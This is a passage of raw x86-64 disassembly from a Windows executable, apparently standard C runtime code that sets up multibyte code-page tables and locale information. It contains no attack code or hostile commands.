   1400064a4:	b2 20                	mov    $0x20,%dl
   1400064a6:	e8 c5 c5 ff ff       	call   0x140002a70
   1400064ab:	48 83 c7 02          	add    $0x2,%rdi
   1400064af:	8a 07                	mov    (%rdi),%al
   1400064b1:	84 c0                	test   %al,%al
   1400064b3:	75 d3                	jne    0x140006488
   1400064b5:	8b 46 0c             	mov    0xc(%rsi),%eax
   1400064b8:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   1400064bd:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400064c2:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400064c6:	8b 46 04             	mov    0x4(%rsi),%eax
   1400064c9:	44 8b cb             	mov    %ebx,%r9d
   1400064cc:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400064d0:	48 8d 84 24 70 03 00 	lea    0x370(%rsp),%rax
   1400064d7:	00 
   1400064d8:	ba 01 00 00 00       	mov    $0x1,%edx
   1400064dd:	33 c9                	xor    %ecx,%ecx
   1400064df:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400064e4:	e8 1b 27 00 00       	call   0x140008c04
   1400064e9:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1400064ee:	8b 46 04             	mov    0x4(%rsi),%eax
   1400064f1:	8b 56 0c             	mov    0xc(%rsi),%edx
   1400064f4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400064f8:	48 8d 84 24 70 01 00 	lea    0x170(%rsp),%rax
   1400064ff:	00 
   140006500:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006504:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006509:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   14000650e:	44 8b c3             	mov    %ebx,%r8d
   140006511:	33 c9                	xor    %ecx,%ecx
   140006513:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140006517:	e8 7c 2d 00 00       	call   0x140009298
   14000651c:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140006521:	8b 46 04             	mov    0x4(%rsi),%eax
   140006524:	8b 56 0c             	mov    0xc(%rsi),%edx
   140006527:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000652b:	48 8d 84 24 70 02 00 	lea    0x270(%rsp),%rax
   140006532:	00 
   140006533:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006537:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000653c:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140006541:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006547:	33 c9                	xor    %ecx,%ecx
   140006549:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000654d:	e8 46 2d 00 00       	call   0x140009298
   140006552:	4c 8d 9c 24 70 03 00 	lea    0x370(%rsp),%r11
   140006559:	00 
   14000655a:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   14000655e:	33 d2                	xor    %edx,%edx
   140006560:	41 f6 03 01          	testb  $0x1,(%r11)
   140006564:	74 0c                	je     0x140006572
   140006566:	80 09 10             	orb    $0x10,(%rcx)
   140006569:	8a 84 14 70 01 00 00 	mov    0x170(%rsp,%rdx,1),%al
   140006570:	eb 10                	jmp    0x140006582
   140006572:	41 f6 03 02          	testb  $0x2,(%r11)
   140006576:	74 12                	je     0x14000658a
   140006578:	80 09 20             	orb    $0x20,(%rcx)
   14000657b:	8a 84 14 70 02 00 00 	mov    0x270(%rsp,%rdx,1),%al
   140006582:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140006588:	eb 07                	jmp    0x140006591
   14000658a:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   140006591:	48 ff c1             	inc    %rcx
   140006594:	48 ff c2             	inc    %rdx
   140006597:	49 83 c3 02          	add    $0x2,%r11
   14000659b:	48 83 eb 01          	sub    $0x1,%rbx
   14000659f:	75 bf                	jne    0x140006560
   1400065a1:	eb 3f                	jmp    0x1400065e2
   1400065a3:	33 d2                	xor    %edx,%edx
   1400065a5:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   1400065a9:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   1400065ad:	41 8d 40 20          	lea    0x20(%r8),%eax
   1400065b1:	83 f8 19             	cmp    $0x19,%eax
   1400065b4:	77 08                	ja     0x1400065be
   1400065b6:	80 09 10             	orb    $0x10,(%rcx)
   1400065b9:	8d 42 20             	lea    0x20(%rdx),%eax
   1400065bc:	eb 0c                	jmp    0x1400065ca
   1400065be:	41 83 f8 19          	cmp    $0x19,%r8d
   1400065c2:	77 0e                	ja     0x1400065d2
   1400065c4:	80 09 20             	orb    $0x20,(%rcx)
   1400065c7:	8d 42 e0             	lea    -0x20(%rdx),%eax
   1400065ca:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   1400065d0:	eb 07                	jmp    0x1400065d9
   1400065d2:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   1400065d9:	ff c2                	inc    %edx
   1400065db:	48 ff c1             	inc    %rcx
   1400065de:	3b d3                	cmp    %ebx,%edx
   1400065e0:	72 c7                	jb     0x1400065a9
   1400065e2:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400065e9:	00 
   1400065ea:	48 33 cc             	xor    %rsp,%rcx
   1400065ed:	e8 4e b4 ff ff       	call   0x140001a40
   1400065f2:	4c 8d 9c 24 80 05 00 	lea    0x580(%rsp),%r11
   1400065f9:	00 
   1400065fa:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400065fe:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006602:	49 8b e3             	mov    %r11,%rsp
   140006605:	5f                   	pop    %rdi
   140006606:	c3                   	ret
   140006607:	cc                   	int3
   140006608:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000660d:	57                   	push   %rdi
   14000660e:	48 83 ec 20          	sub    $0x20,%rsp
   140006612:	e8 f9 cf ff ff       	call   0x140003610
   140006617:	48 8b f8             	mov    %rax,%rdi
   14000661a:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   140006620:	85 0d ea da 00 00    	test   %ecx,0xdaea(%rip)        # 0x140014110
   140006626:	74 13                	je     0x14000663b
   140006628:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   14000662f:	00 
   140006630:	74 09                	je     0x14000663b
   140006632:	48 8b 98 b8 00 00 00 	mov    0xb8(%rax),%rbx
   140006639:	eb 6e                	jmp    0x1400066a9
   14000663b:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140006640:	e8 27 d6 ff ff       	call   0x140003c6c
   140006645:	90                   	nop
   140006646:	48 8b 9f b8 00 00 00 	mov    0xb8(%rdi),%rbx
   14000664d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006652:	48 3b 1d e7 d5 00 00 	cmp    0xd5e7(%rip),%rbx        # 0x140013c40
   140006659:	74 44                	je     0x14000669f
   14000665b:	48 85 db             	test   %rbx,%rbx
   14000665e:	74 1c                	je     0x14000667c
   140006660:	f0 83 03 ff          	lock addl $0xffffffff,(%rbx)
   140006664:	75 16                	jne    0x14000667c
   140006666:	48 8d 05 a3 d1 00 00 	lea    0xd1a3(%rip),%rax        # 0x140013810
   14000666d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006672:	48 3b c8             	cmp    %rax,%rcx
   140006675:	74 05                	je     0x14000667c
   140006677:	e8 9c c3 ff ff       	call   0x140002a18
   14000667c:	48 8b 05 bd d5 00 00 	mov    0xd5bd(%rip),%rax        # 0x140013c40
   140006683:	48 89 87 b8 00 00 00 	mov    %rax,0xb8(%rdi)
   14000668a:	48 8b 05 af d5 00 00 	mov    0xd5af(%rip),%rax        # 0x140013c40
   140006691:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006696:	f0 83 00 01          	lock addl $0x1,(%rax)
   14000669a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000669f:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400066a4:	e8 c3 d4 ff ff       	call   0x140003b6c
   1400066a9:	48 85 db             	test   %rbx,%rbx
   1400066ac:	75 08                	jne    0x1400066b6
   1400066ae:	8d 4b 20             	lea    0x20(%rbx),%ecx
   1400066b1:	e8 ce b8 ff ff       	call   0x140001f84
   1400066b6:	48 8b c3             	mov    %rbx,%rax
   1400066b9:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400066be:	48 83 c4 20          	add    $0x20,%rsp
   1400066c2:	5f                   	pop    %rdi
   1400066c3:	c3                   	ret
   1400066c4:	40 53                	rex push %rbx
   1400066c6:	48 83 ec 40          	sub    $0x40,%rsp
   1400066ca:	8b d9                	mov    %ecx,%ebx
   1400066cc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400066d1:	33 d2                	xor    %edx,%edx
   1400066d3:	e8 a8 df ff ff       	call   0x140004680
   1400066d8:	83 25 39 ec 00 00 00 	andl   $0x0,0xec39(%rip)        # 0x140015318
   1400066df:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1400066e2:	75 25                	jne    0x140006709
   1400066e4:	c7 05 2a ec 00 00 01 	movl   $0x1,0xec2a(%rip)        # 0x140015318
   1400066eb:	00 00 00 
   1400066ee:	ff 15 64 7b 00 00    	call   *0x7b64(%rip)        # 0x14000e258
   1400066f4:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400066f9:	74 53                	je     0x14000674e
   1400066fb:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006700:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140006707:	eb 45                	jmp    0x14000674e
   140006709:	83 fb fd             	cmp    $0xfffffffd,%ebx
   14000670c:	75 12                	jne    0x140006720
   14000670e:	c7 05 00 ec 00 00 01 	movl   $0x1,0xec00(%rip)        # 0x140015318
   140006715:	00 00 00 
   140006718:	ff 15 32 7b 00 00    	call   *0x7b32(%rip)        # 0x14000e250
   14000671e:	eb d4                	jmp    0x1400066f4
   140006720:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140006723:	75 14                	jne    0x140006739
   140006725:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000672a:	c7 05 e4 eb 00 00 01 	movl   $0x1,0xebe4(%rip)        # 0x140015318
   140006731:	00 00 00 
   140006734:	8b 40 04             	mov    0x4(%rax),%eax
   140006737:	eb bb                	jmp    0x1400066f4
   140006739:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000673e:	74 0c                	je     0x14000674c
   140006740:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006745:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000674c:	8b c3                	mov    %ebx,%eax
   14000674e:	48 83 c4 40          	add    $0x40,%rsp
   140006752:	5b                   	pop    %rbx
   140006753:	c3                   	ret
   140006754:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006759:	55                   	push   %rbp
   14000675a:	56                   	push   %rsi
   14000675b:	57                   	push   %rdi
   14000675c:	41 54                	push   %r12
   14000675e:	41 55                	push   %r13
   140006760:	48 83 ec 40          	sub    $0x40,%rsp
   140006764:	48 8b 05 dd c8 00 00 	mov    0xc8dd(%rip),%rax        # 0x140013048
   14000676b:	48 33 c4             	xor    %rsp,%rax
   14000676e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006773:	48 8b f2             	mov    %rdx,%rsi
   140006776:	e8 49 ff ff ff       	call   0x1400066c4
   14000677b:	33 db                	xor    %ebx,%ebx
   14000677d:	8b f8                	mov    %eax,%edi
   14000677f:	3b c3                	cmp    %ebx,%eax
   140006781:	75 0d                	jne    0x140006790
   140006783:	48 8b ce             	mov    %rsi,%rcx
   140006786:	e8 05 fc ff ff       	call   0x140006390
   14000678b:	e9 18 02 00 00       	jmp    0x1400069a8
   140006790:	4c 8d 2d b9 d4 00 00 	lea    0xd4b9(%rip),%r13        # 0x140013c50
   140006797:	8b cb                	mov    %ebx,%ecx
   140006799:	48 8b eb             	mov    %rbx,%rbp
   14000679c:	49 8b c5             	mov    %r13,%rax
   14000679f:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400067a5:	39 38                	cmp    %edi,(%rax)
   1400067a7:	0f 84 27 01 00 00    	je     0x1400068d4
   1400067ad:	41 03 cc             	add    %r12d,%ecx
   1400067b0:	49 03 ec             	add    %r12,%rbp
   1400067b3:	48 83 c0 30          	add    $0x30,%rax
   1400067b7:	83 f9 05             	cmp    $0x5,%ecx
   1400067ba:	72 e9                	jb     0x1400067a5
   1400067bc:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   1400067c2:	0f 84 04 01 00 00    	je     0x1400068cc
   1400067c8:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
   1400067ce:	0f 84 f8 00 00 00    	je     0x1400068cc
   1400067d4:	0f b7 cf             	movzwl %di,%ecx
   1400067d7:	ff 15 83 7a 00 00    	call   *0x7a83(%rip)        # 0x14000e260
   1400067dd:	3b c3                	cmp    %ebx,%eax
   1400067df:	0f 84 e7 00 00 00    	je     0x1400068cc
   1400067e5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400067ea:	8b cf                	mov    %edi,%ecx
   1400067ec:	ff 15 56 7a 00 00    	call   *0x7a56(%rip)        # 0x14000e248
   1400067f2:	3b c3                	cmp    %ebx,%eax
   1400067f4:	0f 84 c6 00 00 00    	je     0x1400068c0
   1400067fa:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   1400067fe:	33 d2                	xor    %edx,%edx
   140006800:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006806:	e8 65 c2 ff ff       	call   0x140002a70
   14000680b:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000680e:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   140006811:	44 39 64 24 20       	cmp    %r12d,0x20(%rsp)
   140006816:	0f 86 8d 00 00 00    	jbe    0x1400068a9
   14000681c:	48 8d 44 24 26       	lea    0x26(%rsp),%rax
   140006821:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140006825:	74 2d                	je     0x140006854
   140006827:	38 58 01             	cmp    %bl,0x1(%rax)
   14000682a:	74 28                	je     0x140006854
   14000682c:	0f b6 38             	movzbl (%rax),%edi
   14000682f:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   140006833:	3b f9                	cmp    %ecx,%edi
   140006835:	77 15                	ja     0x14000684c
   140006837:	2b cf                	sub    %edi,%ecx
   140006839:	48 8d 54 37 1d       	lea    0x1d(%rdi,%rsi,1),%rdx
   14000683e:	41 03 cc             	add    %r12d,%ecx
   140006841:	80 0a 04             	orb    $0x4,(%rdx)
   140006844:	49 03 d4             	add    %r12,%rdx
   140006847:	49 2b cc             	sub    %r12,%rcx
   14000684a:	75 f5                	jne    0x140006841
   14000684c:	48 83 c0 02          	add    $0x2,%rax
   140006850:	38 18                	cmp    %bl,(%rax)
   140006852:	75 d3                	jne    0x140006827
   140006854:	48 8d 46 1e          	lea    0x1e(%rsi),%rax
   140006858:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   14000685d:	80 08 08             	orb    $0x8,(%rax)
   140006860:	49 03 c4             	add    %r12,%rax
   140006863:	49 2b cc             	sub    %r12,%rcx
   140006866:	75 f5                	jne    0x14000685d
   140006868:	8b 4e 04             	mov    0x4(%rsi),%ecx
   14000686b:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140006871:	74 28                	je     0x14000689b
   140006873:	83 e9 04             	sub    $0x4,%ecx
   140006876:	74 1c                	je     0x140006894
   140006878:	83 e9 0d             	sub    $0xd,%ecx
   14000687b:	74 10                	je     0x14000688d
   14000687d:	41 3b cc             	cmp    %r12d,%ecx
   140006880:	74 04                	je     0x140006886
   140006882:	8b c3                	mov    %ebx,%eax
   140006884:	eb 1a                	jmp    0x1400068a0
   140006886:	b8 04 04 00 00       	mov    $0x404,%eax
   14000688b:	eb 13                	jmp    0x1400068a0
   14000688d:	b8 12 04 00 00       	mov    $0x412,%eax
   140006892:	eb 0c                	jmp    0x1400068a0
   140006894:	b8 04 08 00 00       	mov    $0x804,%eax
   140006899:	eb 05                	jmp    0x1400068a0
   14000689b:	b8 11 04 00 00       	mov    $0x411,%eax
   1400068a0:	89 46 0c             	mov    %eax,0xc(%rsi)
   1400068a3:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   1400068a7:	eb 03                	jmp    0x1400068ac
   1400068a9:	89 5e 08             	mov    %ebx,0x8(%rsi)
   1400068ac:	48 8d 7e 10          	lea    0x10(%rsi),%rdi
   1400068b0:	0f b7 c3             	movzwl %bx,%eax
   1400068b3:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400068b8:	66 f3 ab             	rep stos %ax,(%rdi)
   1400068bb:	e9 e0 00 00 00       	jmp    0x1400069a0
   1400068c0:	39 1d 52 ea 00 00    	cmp    %ebx,0xea52(%rip)        # 0x140015318
   1400068c6:	0f 85 b7 fe ff ff    	jne    0x140006783
   1400068cc:	83 c8 ff             	or     $0xffffffff,%eax
   1400068cf:	e9 d6 00 00 00       	jmp    0x1400069aa
   1400068d4:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   1400068d8:	33 d2                	xor    %edx,%edx
   1400068da:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400068e0:	e8 8b c1 ff ff       	call   0x140002a70
   1400068e5:	48 8d 6c 6d 00       	lea    0x0(%rbp,%rbp,2),%rbp
   1400068ea:	4c 8d 1d 57 d3 00 00 	lea    0xd357(%rip),%r11        # 0x140013c48
   1400068f1:	48 03 ed             	add    %rbp,%rbp
   1400068f4:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   1400068fa:	4d 8d 44 ed 10       	lea    0x10(%r13,%rbp,8),%r8
   1400068ff:	49 8b c8             	mov    %r8,%rcx
   140006902:	41 38 18             	cmp    %bl,(%r8)
   140006905:	74 31                	je     0x140006938
   140006907:	38 59 01             	cmp    %bl,0x1(%rcx)
   14000690a:	74 2c                	je     0x140006938
   14000690c:	0f b6 11             	movzbl (%rcx),%edx
   14000690f:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140006913:	3b d0                	cmp    %eax,%edx
   140006915:	77 19                	ja     0x140006930
   140006917:	4c 8d 4c 32 1d       	lea    0x1d(%rdx,%rsi,1),%r9
   14000691c:	41 8a 03             	mov    (%r11),%al
   14000691f:	41 03 d4             	add    %r12d,%edx
   140006922:	41 08 01             	or     %al,(%r9)
   140006925:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140006929:	4d 03 cc             	add    %r12,%r9
   14000692c:	3b d0                	cmp    %eax,%edx
   14000692e:	76 ec                	jbe    0x14000691c
   140006930:	48 83 c1 02          	add    $0x2,%rcx
   140006934:	38 19                	cmp    %bl,(%rcx)
   140006936:	75 cf                	jne    0x140006907
   140006938:	49 83 c0 08          	add    $0x8,%r8
   14000693c:	4d 03 dc             	add    %r12,%r11
   14000693f:	4d 2b d4             	sub    %r12,%r10
   140006942:	75 bb                	jne    0x1400068ff
   140006944:	89 7e 04             	mov    %edi,0x4(%rsi)
   140006947:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   14000694d:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   140006951:	74 24                	je     0x140006977
   140006953:	83 ef 04             	sub    $0x4,%edi
   140006956:	74 18                	je     0x140006970
   140006958:	83 ef 0d             	sub    $0xd,%edi
   14000695b:	74 0c                	je     0x140006969
   14000695d:	41 3b fc             	cmp    %r12d,%edi
   140006960:	75 1a                	jne    0x14000697c
   140006962:	bb 04 04 00 00       	mov    $0x404,%ebx
   140006967:	eb 13                	jmp    0x14000697c
   140006969:	bb 12 04 00 00       	mov    $0x412,%ebx
   14000696e:	eb 0c                	jmp    0x14000697c
   140006970:	bb 04 08 00 00       	mov    $0x804,%ebx
   140006975:	eb 05                	jmp    0x14000697c
   140006977:	bb 11 04 00 00       	mov    $0x411,%ebx
   14000697c:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   14000697f:	48 8d 56 10          	lea    0x10(%rsi),%rdx
   140006983:	49 8d 7c ed 04       	lea    0x4(%r13,%rbp,8),%rdi
   140006988:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000698d:	0f b7 07             	movzwl (%rdi),%eax
   140006990:	48 83 c7 02          	add    $0x2,%rdi
   140006994:	66 89 02             	mov    %ax,(%rdx)
   140006997:	48 83 c2 02          	add    $0x2,%rdx
   14000699b:	49 2b cc             	sub    %r12,%rcx
   14000699e:	75 ed                	jne    0x14000698d
   1400069a0:	48 8b ce             	mov    %rsi,%rcx
   1400069a3:	e8 7c fa ff ff       	call   0x140006424
   1400069a8:	33 c0                	xor    %eax,%eax
   1400069aa:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400069af:	48 33 cc             	xor    %rsp,%rcx
   1400069b2:	e8 89 b0 ff ff       	call   0x140001a40
   1400069b7:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400069be:	00 
   1400069bf:	48 83 c4 40          	add    $0x40,%rsp
   1400069c3:	41 5d                	pop    %r13
   1400069c5:	41 5c                	pop    %r12
   1400069c7:	5f                   	pop    %rdi
   1400069c8:	5e                   	pop    %rsi
   1400069c9:	5d                   	pop    %rbp
   1400069ca:	c3                   	ret
   1400069cb:	cc                   	int3
   1400069cc:	48 8b c4             	mov    %rsp,%rax
   1400069cf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400069d3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400069d7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400069db:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400069df:	41 55                	push   %r13
   1400069e1:	48 83 ec 30          	sub    $0x30,%rsp
   1400069e5:	8b f9                	mov    %ecx,%edi
   1400069e7:	41 83 cd ff          	or     $0xffffffff,%r13d
   1400069eb:	e8 20 cc ff ff       	call   0x140003610
   1400069f0:	48 8b f0             	mov    %rax,%rsi
   1400069f3:	e8 10 fc ff ff       	call   0x140006608
   1400069f8:	48 8b 9e b8 00 00 00 	mov    0xb8(%rsi),%rbx
   1400069ff:	8b cf                	mov    %edi,%ecx
   140006a01:	e8 be fc ff ff       	call   0x1400066c4
   140006a06:	44 8b e0             	mov    %eax,%r12d
   140006a09:	3b 43 04             	cmp    0x4(%rbx),%eax
   140006a0c:	0f 84 8f 01 00 00    	je     0x140006ba1
   140006a12:	b9 20 02 00 00       	mov    $0x220,%ecx
   140006a17:	e8 28 f4 ff ff       	call   0x140005e44
   140006a1c:	48 8b d8             	mov    %rax,%rbx
   140006a1f:	33 ff                	xor    %edi,%edi
   140006a21:	48 3b c7             	cmp    %rdi,%rax
   140006a24:	0f 84 7c 01 00 00    	je     0x140006ba6
   140006a2a:	48 8b 96 b8 00 00 00 	mov    0xb8(%rsi),%rdx
   140006a31:	48 8b c8             	mov    %rax,%rcx
   140006a34:	41 b8 20 02 00 00    	mov    $0x220,%r8d
   140006a3a:	e8 31 c1 ff ff       	call   0x140002b70
   140006a3f:	89 3b                	mov    %edi,(%rbx)
   140006a41:	48 8b d3             	mov    %rbx,%rdx
   140006a44:	41 8b cc             	mov    %r12d,%ecx
   140006a47:	e8 08 fd ff ff       	call   0x140006754
   140006a4c:	44 8b e8             	mov    %eax,%r13d
   140006a4f:	3b c7                	cmp    %edi,%eax
   140006a51:	0f 85 24 01 00 00    	jne    0x140006b7b
   140006a57:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   140006a5e:	f0 83 01 ff          	lock addl $0xffffffff,(%rcx)
   140006a62:	75 1a                	jne    0x140006a7e
   140006a64:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   140006a6b:	4c 8d 25 9e cd 00 00 	lea    0xcd9e(%rip),%r12        # 0x140013810
   140006a72:	49 3b cc             	cmp    %r12,%rcx
   140006a75:	74 0e                	je     0x140006a85
   140006a77:	e8 9c bf ff ff       	call   0x140002a18
   140006a7c:	eb 07                	jmp    0x140006a85
   140006a7e:	4c 8d 25 8b cd 00 00 	lea    0xcd8b(%rip),%r12        # 0x140013810
   140006a85:	48 89 9e b8 00 00 00 	mov    %rbx,0xb8(%rsi)
   140006a8c:	f0 83 03 01          	lock addl $0x1,(%rbx)
   140006a90:	f6 86 c8 00 00 00 02 	testb  $0x2,0xc8(%rsi)
   140006a97:	0f 85 09 01 00 00    	jne    0x140006ba6
   140006a9d:	f6 05 6c d6 00 00 01 	testb  $0x1,0xd66c(%rip)        # 0x140014110
   140006aa4:	0f 85 fc 00 00 00    	jne    0x140006ba6
   140006aaa:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140006aaf:	e8 b8 d1 ff ff       	call   0x140003c6c
   140006ab4:	90                   	nop
   140006ab5:	8b 43 04             	mov    0x4(%rbx),%eax
   140006ab8:	89 05 6e e8 00 00    	mov    %eax,0xe86e(%rip)        # 0x14001532c
   140006abe:	8b 43 08             	mov    0x8(%rbx),%eax
   140006ac1:	89 05 69 e8 00 00    	mov    %eax,0xe869(%rip)        # 0x140015330
   140006ac7:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006aca:	89 05 64 e8 00 00    	mov    %eax,0xe864(%rip)        # 0x140015334
   140006ad0:	8b d7                	mov    %edi,%edx
   140006ad2:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140006ad6:	4c 8d 05 23 95 ff ff 	lea    -0x6add(%rip),%r8        # 0x140000000
   140006add:	83 fa 05             	cmp    $0x5,%edx
   140006ae0:	7d 19                	jge    0x140006afb
   140006ae2:	48 63 ca             	movslq %edx,%rcx
   140006ae5:	0f b7 44 4b 10       	movzwl 0x10(%rbx,%rcx,2),%eax
   140006aea:	66 41 89 84 48 20 53 	mov    %ax,0x15320(%r8,%rcx,2)
   140006af1:	01 00 
   140006af3:	ff c2                	inc    %edx
   140006af5:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140006af9:	eb e2                	jmp    0x140006add
   140006afb:	8b d7                	mov    %edi,%edx
   140006afd:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140006b01:	81 fa 01 01 00 00    	cmp    $0x101,%edx
   140006b07:	7d 17                	jge    0x140006b20
   140006b09:	48 63 ca             	movslq %edx,%rcx
   140006b0c:	8a 44 19 1c          	mov    0x1c(%rcx,%rbx,1),%al
   140006b10:	42 88 84 01 30 3a 01 	mov    %al,0x13a30(%rcx,%r8,1)
   140006b17:	00 
   140006b18:	ff c2                	inc    %edx
   140006b1a:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140006b1e:	eb e1                	jmp    0x140006b01
   140006b20:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140006b24:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   140006b2a:	7d 1a                	jge    0x140006b46
   140006b2c:	48 63 cf             	movslq %edi,%rcx
   140006b2f:	8a 84 19 1d 01 00 00 	mov    0x11d(%rcx,%rbx,1),%al
   140006b36:	42 88 84 01 40 3b 01 	mov    %al,0x13b40(%rcx,%r8,1)
   140006b3d:	00 
   140006b3e:	ff c7                	inc    %edi
   140006b40:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140006b44:	eb de                	jmp    0x140006b24
   140006b46:	48 8b 05 f3 d0 00 00 	mov    0xd0f3(%rip),%rax        # 0x140013c40
   140006b4d:	f0 83 00 ff          	lock addl $0xffffffff,(%rax)
   140006b51:	75 11                	jne    0x140006b64
   140006b53:	48 8b 0d e6 d0 00 00 	mov    0xd0e6(%rip),%rcx        # 0x140013c40
   140006b5a:	49 3b cc             	cmp    %r12,%rcx
   140006b5d:	74 05                	je     0x140006b64
   140006b5f:	e8 b4 be ff ff       	call   0x140002a18
   140006b64:	48 89 1d d5 d0 00 00 	mov    %rbx,0xd0d5(%rip)        # 0x140013c40
   140006b6b:	f0 83 03 01          	lock addl $0x1,(%rbx)
   140006b6f:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140006b74:	e8 f3 cf ff ff       	call   0x140003b6c
   140006b79:	eb 2b                	jmp    0x140006ba6
   140006b7b:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006b7e:	75 26                	jne    0x140006ba6
   140006b80:	4c 8d 25 89 cc 00 00 	lea    0xcc89(%rip),%r12        # 0x140013810
   140006b87:	49 3b dc             	cmp    %r12,%rbx
   140006b8a:	74 08                	je     0x140006b94
   140006b8c:	48 8b cb             	mov    %rbx,%rcx
   140006b8f:	e8 84 be ff ff       	call   0x140002a18
   140006b94:	e8 0b c5 ff ff       	call   0x1400030a4
   140006b99:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006b9f:	eb 05                	jmp    0x140006ba6
   140006ba1:	33 ff                	xor    %edi,%edi
   140006ba3:	44 8b ef             	mov    %edi,%r13d
   140006ba6:	41 8b c5             	mov    %r13d,%eax
   140006ba9:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006bae:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006bb3:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140006bb8:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   140006bbd:	48 83 c4 30          	add    $0x30,%rsp
   140006bc1:	41 5d                	pop    %r13
   140006bc3:	c3                   	ret
   140006bc4:	48 83 ec 28          	sub    $0x28,%rsp
   140006bc8:	83 3d d1 fb 00 00 00 	cmpl   $0x0,0xfbd1(%rip)        # 0x1400167a0
   140006bcf:	75 14                	jne    0x140006be5
   140006bd1:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   140006bd6:	e8 f1 fd ff ff       	call   0x1400069cc
